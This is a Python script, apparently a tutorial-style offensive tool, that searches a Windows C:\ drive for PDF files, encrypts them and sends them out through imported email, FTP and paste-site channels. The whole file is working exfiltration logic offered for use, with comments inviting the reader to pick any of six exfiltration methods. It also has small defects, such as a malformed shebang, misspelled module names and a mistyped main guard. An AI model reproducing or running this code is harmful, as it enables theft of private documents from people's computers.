#!/bin/bash/env python

# In this cript we combine methods written in 'email_exfil.py' and 'transmit_exfil.py'
# Once the modules are imported you can proceed to exfiltrating data

from cryptor import encrypt, decrypt
from email_exfil import outlook, plain_email 
from trasmit_exfil import plain_tfp, transmit
from paste_exfil import ie_paste, plain_paste

import os

EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_tfp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
}

# This function will find the documents you want to exfiltrate 
def find_docs(doc_type='.pdf'):
    for parent, _, filenames in os.walk('C:\\'):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                yield document_path

# This is the main function that orchastrates the exfiltration
def exfiltrate(document_path, method):
    if method in ['transmit', 'plain_ftp']:
        filename = f'c:\\windows\\temp\\{os.path.basename(document_path)}'
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        with open(filename, 'wb') as f1:
            f1.write(encrypt(contents))

        EXFIL[method](filename)
        os.unlink(filename)
    else:
        with open(document_path, 'rb') as f:
            contents = f.read()
        title = os.path.basename(document_path)
        contents = encrypt(contents)
        EXFIL[method](title, contents)

# Here we use 'plain_paste' as an example. Feel free to use any of the six functions we defined before
if __name__ == '_main__':
    for fpath in find_docs():
        exfiltrate(fpath, 'plain_paste')